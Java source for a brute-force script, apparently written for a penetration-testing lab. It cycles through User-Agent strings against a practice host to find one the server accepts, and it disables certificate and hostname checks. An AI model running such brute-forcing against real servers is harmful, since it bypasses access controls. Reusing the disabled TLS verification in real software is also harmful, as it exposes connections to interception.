package org.example;

import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.HttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.conn.ssl.TrustSelfSignedStrategy;
import org.apache.http.conn.ssl.NoopHostnameVerifier;
import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
import org.apache.http.ssl.SSLContexts;
import javax.net.ssl.SSLContext;
import org.apache.http.util.EntityUtils;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;

public class UserAgentBruteForce {
    static String[] userAgents = {
            "Mozilla/45.0 (Windows NT 10.0; Win64; x64) Firefox/<version>",
            "Mozilla/<version> (Windows NT 10.0; Win64; x64) Firefox/<version>",
            "Motorola DROID2 (KHTML, like Gecko) Curl/<version>",
            "FlipboardProxy/<version>",
            "Mozilla/<version> (X11; Linux x86_64) AppleWebKit/<version> (KHTML, like Gecko) Chrome/<version> Safari/<version>",
            "AppleWebKit/<version> (KHTML, like Gecko) Firefox/<version>",
            "Mozilla/<version> (Macintosh; U; Arm Mac OS X; en-US ) Firefox/<version>"
    };
    static int maxVersion = 150;


    public static void main(String[] args) {
        try {
            SSLContext sslContext = SSLContexts.custom()
                    .loadTrustMaterial(new TrustSelfSignedStrategy())
                    .build();

            HttpClient httpClient = HttpClients.custom()
                    .setSSLSocketFactory(new SSLConnectionSocketFactory(sslContext, NoopHostnameVerifier.INSTANCE))
                    .build();

            String targetURL = "https://pentest.blackbox.team:444/index.php";

            try (BufferedWriter writer = new BufferedWriter(new FileWriter("responses.txt"));
                 BufferedWriter goodsWriter = new BufferedWriter(new FileWriter("goods.txt"))) {
                for (String userAgent : userAgents) {
                    for (int version = 1; version <= maxVersion; version++) {
                        String userAgentString = userAgent.replaceAll("<version>", version + ".0");

                        try {
                            HttpGet request = new HttpGet(targetURL);
                            request.addHeader("User-Agent", userAgentString);
                            HttpResponse response = httpClient.execute(request);

                            String responseContent = EntityUtils.toString(response.getEntity());
                            boolean isValid = response.getStatusLine().getStatusCode() == 200 && responseContent.contains("GOOD OK");

                            if (isValid) {
                                goodsWriter.write("Found a valid User-Agent: ");
                                goodsWriter.write(userAgentString + "\n");
                                break;
                            }

                            writer.write("Access denied for User-Agent: ");
                            writer.write(userAgentString + "\n");
                        } catch (Exception e) {
                            System.out.println("Error for User-Agent: " + userAgentString);
                            e.printStackTrace();
                        }
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}